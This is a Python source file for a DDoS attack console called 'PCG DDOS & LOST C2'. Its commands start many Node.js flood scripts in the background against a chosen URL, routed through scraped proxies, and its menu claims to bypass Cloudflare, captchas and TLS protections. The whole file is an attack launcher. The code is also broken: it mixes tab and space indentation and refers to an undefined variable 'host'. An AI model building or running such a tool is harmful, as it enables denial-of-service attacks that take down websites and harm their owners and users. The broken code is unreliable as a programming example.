# -*- coding: utf-8 -*-
from operator import index
import socket
import random
import string
import threading
import getpass
import urllib
import getpass
import colorama
import os,sys,time,re,requests,json
from requests import post
from time import sleep
from datetime import datetime, date
from colorama import Fore, Back, init
import codecs

author = ""

def prints(start_color, end_color, text):
    start_r, start_g, start_b = start_color
    end_r, end_g, end_b = end_color

    for i in range(len(text)):
        r = int(start_r + (end_r - start_r) * i / len(text))
        g = int(start_g + (end_g - start_g) * i / len(text))
        b = int(start_b + (end_b - start_b) * i / len(text))

        color_code = f"\033[38;2;{r};{g};{b}m"
        print(color_code + text[i], end="")
    
start_color = (255, 255, 255)
end_color = (0, 0, 255)

class Color:
    colorama.init()

def menu():
  print('''
\x1b[0m [\x1b[38;2;205;6;844mCLEAR\x1b[0m]  : CLEAR THE TERMINAL
\x1b[0m [\x1b[38;2;196;8;844mSCRAPE\x1b[0m] : PROXY SCRAPER 
\x1b[0m [\x1b[38;2;196;8;844mINSTALL\x1b[0m] : INSTALL MODULES 
\x1b[0m [\x1b[38;2;160;15;845mLAYER7\x1b[0m] : SHOW LAYER7
''')

def layer7():
    print("""
\x1b[0m [\x1b[38;2;205;6;844mH\x1b[38;2;196;8;844mT\x1b[38;2;169;13;846mT\x1b[38;2;160;15;845mP\x1b[0m\x1b[38;2;205;6;844mP\x1b[0m]\x1b[0m\x1b[38;2;205;6;844mS\x1b[0m]   : https method for akaimai isp and amazon isp with big requests
\x1b[0m [\x1b[38;2;196;8;844mT\x1b[38;2;169;13;846mL\x1b[38;2;160;15;845mS\x1b[0m]   :  TLS method with big requests
\x1b[0m [\x1b[38;2;205;6;844mB\x1b[38;2;196;8;844mY\x1b[38;2;169;13;846mP\x1b[38;2;160;15;845mA\x1b[0m\x1b[38;2;205;6;844mS\x1b[0m]\x1b[0m\x1b[38;2;205;6;844mS\x1b[0m]   : Bypass any cf site and high request
\x1b[0m [\x1b[38;2;205;6;844mB\x1b[38;2;196;8;844mR\x1b[38;2;160;15;845mO\x1b[0m\x1b[38;2;205;6;844mW\x1b[0m]\x1b[0m\x1b[38;2;205;6;844mS\x1b[0m]\x1b[0m\x1b[38;2;205;6;844mE\x1b[0m]\x1b[0m\x1b[38;2;205;6;844mR\x1b[0m]    : bypass for captcha uam tls guard Inc.
""")

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("""\033[36m
\x1b[38;2;62;40;848m⠀⠀    ⠀⠀⠀⠀⢀⣤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⢤⣤⣀⣀⡀⠀⠀⠀⠀⠀⠀
\x1b[38;2;62;40;848m⠀   ⠀ ⠀⠀⢀⡼⠋⠀⣀⠄⡂⠍⣀⣒⣒⠂⠀⠬⠤⠤⠬⠍⠉⠝⠲⣄⡀⠀⠀
\x1b[38;2;62;40;848m⠀⠀    ⠀⢀⡾⠁⠀⠊⢔⠕⠈⣀⣀⡀⠈⠆⠀⠀⠀⡍⠁⠀⠁⢂⠀⠈⣷⠀⠀
\x1b[38;2;62;40;848m⠀    ⠀⣠⣾⠥⠀⠀⣠⢠⣞⣿⣿⣿⣉⠳⣄⠀⠀⣀⣤⣶⣶⣶⡄⠀⠀⣘⢦⡀
\x1b[38;2;62;40;848m    ⢀⡞⡍⣠⠞⢋⡛⠶⠤⣤⠴⠚⠀⠈⠙⠁⠀⠀⢹⡏⠁⠀⣀⣠⠤⢤⡕⠱⣷
\x1b[38;2;62;40;848m    ⠘⡇⠇⣯⠤⢾⡙⠲⢤⣀⡀⠤⠀⢲⡖⣂⣀⠀⠀⢙⣶⣄⠈⠉⣸⡄⠠⣠⡿
\x1b[38;2;62;40;848m ⠀   ⠹⣜⡪⠀⠈⢷⣦⣬⣏⠉⠛⠲⣮⣧⣁⣀⣀⠶⠞⢁⣀⣨⢶⢿⣧⠉⡼⠁
\x1b[38;2;62;40;848m⠀    ⠀⠈⢷⡀⠀⠀⠳⣌⡟⠻⠷⣶⣧⣀⣀⣹⣉⣉⣿⣉⣉⣇⣼⣾⣿⠀⡇⠀
\x1b[38;2;62;40;848m⠀    ⠀⠀⠈⢳⡄⠀⠀⠘⠳⣄⡀⡼⠈⠉⠛⡿⠿⠿⡿⠿⣿⢿⣿⣿⡇⠀⡇⠀
\x1b[38;2;62;40;848m⠀⠀⠀    ⠀⠀⠙⢦⣕⠠⣒⠌⡙⠓⠶⠤⣤⣧⣀⣸⣇⣴⣧⠾⠾⠋⠀⠀⡇⠀
\x1b[38;2;62;40;848m  ⠀⠀⠀     ⠀⠀⠈⠙⠶⣭⣒⠩⠖⢠⣤⠄⠀⠀⠀⠀⠀⠠⠔⠁⡰⠀⣧⠀
\x1b[38;2;62;40;848m⠀⠀⠀ ⠀⠀⠀⠀   ⠀⠀⠀⠀⠉⠛⠲⢤⣀⣀⠉⠉⠀⠀⠀⠀⠀⠁⠀⣠⠏⠀
\x1b[38;2;62;40;848m⠀⠀⠀⠀ ⠀⠀⠀ ⠀   ⠀ ⠀⠀⠀⠀⠀⠈⠉⠉⠛⠒⠲⠶⠤⠴⠒⠚⠁⠀⠀   
\x1b[0m                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀     PCG DDOS & LOST C2
\x1b[0m                 ⠀⠀⠀⠀TYPE [\x1b[38;2;205;6;844mH\x1b[38;2;196;8;844mE\x1b[38;2;169;13;846mL\x1b[38;2;160;15;845mP\x1b[0m] TO SEE OUR COMMANDS LIST
\033[0m""")

    while True:
        sys.stdout.write(f"\x1b]2;[\] PCG-DDoS :: Online Users: [∞] :: Attack Sended: [∞] :: Expired: [∞]\x07")
        sin = input(" "+Back.WHITE+Fore.RED+" Xander • DDoS "+Fore.RESET+Back.RESET+" ►► ")
        sinput = sin.split(" ")[0]
        if sinput == "reset" or sinput == "RESET":
            os.system ("python3 main.py")
        if sinput == "clear" or sinput == "CLEAR":
            os.system ("clear")
            main()
        if sinput == "help" or sinput == "HELP":
            menu()
        if sinput == "layer7" or sinput == "LAYER7" or sinput == "l7" or sinput == "L7":
            layer7()
      
        elif sinput == "scrape" or sinput == "SCRAPE":
                os.system(f'cd L7 && screen -dm node prx.js')
                main()
                
        elif sinput == "install" or sinput == "INSTALL":
                os.system(f'cd L7 && screen -dm node auto_install_modules.js yuki1.js yuki.js HTTPS.js MIXBYPASS.js TLS-VIP.js TLS-DETECT.js tlsv2.js tlsua.js TLS-YUKI.js tls.js yuki3.js yuki4.js BROWSER.js Bypass1.js')
                main()
                                
#########LAYER-7########  
        elif sinput == "HTTPS" or sinput == "https":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                time = sin.split()[3]
                os.system(f'cd L7 && screen -dm node Nuker.js {host} {time} 5 prx.txt 128')
				os.system(f'cd L7 && screen -dm node TLS-DETECT {host} {time} 128 5 prx.txt')
				os.system(f'cd L7 && screen -dm node TLS.js {host} {time} 128 5 prx.txt')
				os.system(f'cd L7 && screen -dm node yukiv1 {host} {time} 128 5 prx.txt')
				os.system(f'cd L7 && screen -dm node HTTP-QUERY {host} {time} 5 prx.txt 128')
				os.system(f'cd L7 && screen -dm node yuki {host} {time} 128 5 prx.txt')
				os.system(f'cd L7 && screen -dm node yukiv1 {host} {time} 128 5 prx.txt')
				os.system(f'cd L7 && screen -dm node yukiv2 {host} {time} 128 5 prx.txt')
				os.system(f'cd L7 && screen -dm node yukiv3 {host} {time} 128 5 prx.txt')
				os.system(f'cd L7 && screen -dm node HTTPSV1 {host} {time} 128 5 prx.txt')
				os.system(f'cd L7 && screen -dm node HTTPSV2 {host} {time} 128 5 prx.txt bypass')
				os.system(f'cd L7 && screen -dm node HTTPS {host} {time} 128 5 prx.txt')
				os.system(f'cd L7 && screen -dm node CF-TLS {host} {time} 128 5 prx.txt')
				os.system(f'cd L7 && screen -dm node Lubox {host} {time} 128 5 prx.txt')
				os.system(f'cd L7 && screen -dm node Crash {host} {time} 128 5 prx.txt')
				os.system(f'cd L7 && screen -dm node Rapid.js GET {time} 15 prx.txt 128 {url}')
                os.system(f'cd L7 && screen -dm node Rapid-Lost.js {url} {time} 10 prx.txt 128')
                os.system(f'cd L7 && screen -dm node Rapid-Lostv1.js {url} {time} 128 15 prx.txt')				
                os.system ("clear")
                print(f"""
\x1b[38;2;214;4;844m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ ╔═╗╔═╗╔╗╔╔╦╗
\x1b[38;2;169;13;846m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ ╚═╗║╣ ║║║ ║
\x1b[38;2;134;20;846m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ ╚═╝╚═╝╝╚╝ ╩
\x1b[0m                            ATTACK HAS BEEN STARTED!
\x1b[38;2;143;18;846m                ╚╦════════════════════════════════════════════╦╝
\x1b[38;2;134;20;846m           ╔═════╩════════════════════════════════════════════╩═════╗\x1b[0m
                   TARGET   : [{Fore.GREEN} {url} {Fore.RESET}]
                   TIME     : [{Fore.GREEN} {time} {Fore.RESET}]
                   PORT     : [{Fore.GREEN} {port} {Fore.RESET}]
                   METHODS  : [{Fore.GREEN} HTTPS {Fore.RESET}]
\x1b[38;2;134;20;846m           ╚════════════════════════════════════════════════════════╝
""")
            except ValueError:
                main()
            except IndexError:
                main()
                
        elif sinput == "TLS" or sinput == "tls":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                time = sin.split()[3]
                os.system(f'cd L7 && screen -dm node TLS {host} {time} 128 5 prx.txt')
				os.system(f'cd L7 && screen -dm node TLS-DETECT {host} {time} 128 5 prx.txt')
				os.system(f'cd L7 && screen -dm node TLS-YUKI {host} {time} 128 5 prx.txt')
				os.system(f'cd L7 && screen -dm node TLS-VIP {host} {time} 128 5 prx.txt')
				os.system(f'cd L7 && screen -dm node TLSV1 {host} {time} 128 5 prx.txt')
				os.system(f'cd L7 && screen -dm node TLSV2 {host} {time} 128 5 prx.txt')
				os.system(f'cd L7 && screen -dm node TLSV3 {host} {time} 128 5 prx.txt')
				os.system(f'cd L7 && screen -dm node CF-TLS {host} {time} 128 5 prx.txt')
				os.system(f'cd L7 && screen -dm node hold {host} {time} 128 5 prx.txt')
				os.system(f'cd L7 && screen -dm node Crash {host} {time} 128 5 prx.txt')
				os.system(f'cd L7 && screen -dm node Lubox {host} {time} 128 5 prx.txt')
				os.system(f'cd L7 && screen -dm node thunder GET {host} {time} 5 128 prx.txt')
				os.system(f'cd L7 && screen -dm node REQ {host} {time} 128 5 prx.txt')
                os.system ("clear")
                print(f"""
\x1b[38;2;214;4;844m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ ╔═╗╔═╗╔╗╔╔╦╗
\x1b[38;2;169;13;846m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ ╚═╗║╣ ║║║ ║
\x1b[38;2;134;20;846m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ ╚═╝╚═╝╝╚╝ ╩
\x1b[0m                            ATTACK HAS BEEN STARTED!
\x1b[38;2;143;18;846m                ╚╦════════════════════════════════════════════╦╝
\x1b[38;2;134;20;846m           ╔═════╩════════════════════════════════════════════╩═════╗\x1b[0m
                   TARGET   : [{Fore.GREEN} {url} {Fore.RESET}]
                   TIME     : [{Fore.GREEN} {time} {Fore.RESET}]
                   PORT     : [{Fore.GREEN} {port} {Fore.RESET}]
                   METHODS  : [{Fore.GREEN} TLS {Fore.RESET}]
\x1b[38;2;134;20;846m           ╚════════════════════════════════════════════════════════╝
""")
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "BYPASS" or sinput == "bypass":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                time = sin.split()[3]
                os.system(f'cd L7 && screen -dm node yuki.js {url} {time} 128 10 prx.txt')
                os.system(f'cd L7 && screen -dm node yukiv1.js {url} {time} 128 15 prx.txt')
                os.system(f'cd L7 && screen -dm node yukiv2.js {url} {time} 128 15 prx.txt')
                os.system(f'cd L7 && screen -dm node yukiv3.js {url} {time} 128 15 prx.txt')
                os.system(f'cd L7 && screen -dm node yukiv4.js {url} {time} 128 15 prx.txt')
                os.system(f'cd L7 && screen -dm node yukiv5.js {url} {time} 128 15 prx.txt')
                os.system(f'cd L7 && screen -dm node yukiv6.js {url} {time} 128 15 prx.txt')
                os.system(f'cd L7 && screen -dm node yukiv7.js {url} {time} 128 15 prx.txt')
                os.system(f'cd L7 && screen -dm node yukiv9.js {url} {time} 128 15 prx.txt')
                os.system(f'cd L7 && screen -dm node yukiv10.js {url} {time} 128 15 prx.txt')
                os.system(f'cd L7 && screen -dm node yukiv11.js GET {time} 15 prx.txt 128 {url}')
                os.system(f'cd L7 && screen -dm node yukiv12.js {url} {time} 128 15 prx.txt')                                
                os.system(f'cd L7 && screen -dm node yukiv13.js {url} {time} 128 15 prx.txt')                                
                os.system(f'cd L7 && screen -dm node yukiv14.js {url} {time} 128 15 prx.txt')                                
                os.system(f'cd L7 && screen -dm node yukiv15.js {url} {time} 128 15 prx.txt')                                
                os.system(f'cd L7 && screen -dm node yukiv16.js {url} {time} 128 15 prx.txt')                                
                os.system(f'cd L7 && screen -dm node yukiv17.js {url} {time} 128 15 prx.txt')                                
                os.system(f'cd L7 && screen -dm node MIX.js {url} {time} 128 15 prx.txt')
                os.system(f'cd L7 && screen -dm node MIXV1.js {url} {time} 128 15 prx.txt')
                os.system(f'cd L7 && screen -dm node MIXV2.js {url} {time} 128 15 prx.txt')
                os.system(f'cd L7 && screen -dm node TLS-YUKI.js {url} {time} 128 15 prx.txt')
                os.system(f'cd L7 && screen -dm node TLS-VIP.js {url} {time} 128 15 prx.txt')
                os.system(f'cd L7 && screen -dm node TLS-DETECT.js {url} {time} 128 15 prx.txt')
                os.system(f'cd L7 && screen -dm node BYPASS.js {url} {time} 128 15 prx.txt')
                os.system(f'cd L7 && screen -dm node BYPASSv1.js {url} {time} 128 15 prx.txt')
                os.system(f'cd L7 && screen -dm node BYPASSv3.js {url} {time} 128 15 prx.txt')
                os.system(f'cd L7 && screen -dm node BYPASSv4.js {url} {time} 128 15 prx.txt')
                os.system(f'cd L7 && screen -dm node BYPASSv2.js {url} {time} 5 prx.txt 128 GET')
                os.system(f'cd L7 && screen -dm node hold {host} {time} 128 5 prx.txt')
				os.system(f'cd L7 && screen -dm node Lubox {host} {time} 128 5 prx.txt')
				os.system(f'cd L7 && screen -dm node thunder GET {host} {time} 5 128 prx.txt')
				os.system(f'cd L7 && screen -dm node REQ {host} {time} 128 5 prx.txt')				
                os.system(f'cd L7 && screen -dm node TLS.js {url} {time} 128 15 prx.txt')
                os.system(f'cd L7 && screen -dm node tlsua.js {url} {time} 128 15 prx.txt')
                os.system(f'cd L7 && screen -dm node TLSV2.js {url} {time} 128 15 prx.txt')
                os.system(f'cd L7 && screen -dm node TLSV1 {host} {time} 128 5 prx.txt')
                os.system(f'cd L7 && screen -dm node TLSV3 {host} {time} 128 5 prx.txt')
                os.system(f'cd L7 && screen -dm node Crash {host} {time} 128 5 prx.txt')
                os.system(f'cd L7 && screen -dm node Nuker.js {url} {time} 10 prx.txt 128')
                os.system(f'cd L7 && screen -dm node Rapid.js GET {time} 15 prx.txt 128 {url}')
                os.system(f'cd L7 && screen -dm node Rapid-Lost.js {url} {time} 10 prx.txt 128')
                os.system(f'cd L7 && screen -dm node Rapid-Lostv1.js {url} {time} 128 15 prx.txt')                               
                os.system(f'cd L7 && screen -dm node NOX.js {url} {time} 15 128 prx.txt')
                os.system(f'cd L7 && screen -dm node HTTP-QUERY {host} {time} 5 prx.txt 128')                               
                os.system ("clear")
                print(f"""
\x1b[38;2;214;4;844m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ ╔═╗╔═╗╔╗╔╔╦╗
\x1b[38;2;169;13;846m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ ╚═╗║╣ ║║║ ║
\x1b[38;2;134;20;846m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ ╚═╝╚═╝╝╚╝ ╩
\x1b[0m                            ATTACK HAS BEEN STARTED!
\x1b[38;2;143;18;846m                ╚╦════════════════════════════════════════════╦╝
\x1b[38;2;134;20;846m           ╔═════╩════════════════════════════════════════════╩═════╗\x1b[0m
                   TARGET   : [{Fore.GREEN} {url} {Fore.RESET}]
                   TIME     : [{Fore.GREEN} {time} {Fore.RESET}]
                   PORT     : [{Fore.GREEN} {port} {Fore.RESET}]
                   METHODS  : [{Fore.GREEN} BYPASS {Fore.RESET}]
\x1b[38;2;134;20;846m           ╚════════════════════════════════════════════════════════╝
""")
            except ValueError:
                main()
            except IndexError:
                main()
                
        elif sinput == "BROWSER" or sinput == "browser":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                time = sin.split()[3]
                os.system(f'cd L7 && screen -dm node BROWSER.js {url} {time} 10 prx.txt 128')
                os.system(f'cd L7 && screen -dm node BROWSERV1.js {url} {time} 10 prx.txt 128')
                os.system(f'cd L7 && screen -dm node BROWSERV2.js {url} {time} 15 128 prx.txt')
                os.system(f'cd L7 && screen -dm node BROWSERV3.js {url} {time} 128 15 prx.txt')
                os.system(f'cd L7 && screen -dm node BYPASS.js {url} {time} 128 15 prx.txt')
                os.system(f'cd L7 && screen -dm node BYPASSv1.js {url} {time} 128 15 prx.txt')
                os.system(f'cd L7 && screen -dm node BYPASSv3.js {url} {time} 128 15 prx.txt')
                os.system(f'cd L7 && screen -dm node BYPASSv4.js {url} {time} 128 15 prx.txt')
                os.system(f'cd L7 && screen -dm node BYPASSv2.js {url} {time} 5 prx.txt 128 GET')
                os.system(f'cd L7 && screen -dm node HTTP-QUERY {host} {time} 5 prx.txt 128')
                os.system(f'cd L7 && screen -dm node NOX.js {url} {time} 15 128 prx.txt')
                os.system(f'cd L7 && screen -dm node Rapid.js GET {time} 15 prx.txt 128 {url}')
                os.system(f'cd L7 && screen -dm node thunder GET {host} {time} 5 128 prx.txt')
                os.system ("clear")
                print(f"""
\x1b[38;2;214;4;844m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ ╔═╗╔═╗╔╗╔╔╦╗
\x1b[38;2;169;13;846m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ ╚═╗║╣ ║║║ ║
\x1b[38;2;134;20;846m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ ╚═╝╚═╝╝╚╝ ╩
\x1b[0m                            ATTACK HAS BEEN STARTED!
\x1b[38;2;143;18;846m                ╚╦════════════════════════════════════════════╦╝
\x1b[38;2;134;20;846m           ╔═════╩════════════════════════════════════════════╩═════╗\x1b[0m
                   TARGET   : [{Fore.GREEN} {url} {Fore.RESET}]
                   TIME     : [{Fore.GREEN} {time} {Fore.RESET}]
                   PORT     : [{Fore.GREEN} {port} {Fore.RESET}]
                   METHODS  : [{Fore.GREEN} BROWSER {Fore.RESET}]
\x1b[38;2;134;20;846m           ╚════════════════════════════════════════════════════════╝
""")
            except ValueError:
                main()
            except IndexError:
                main()
                
main()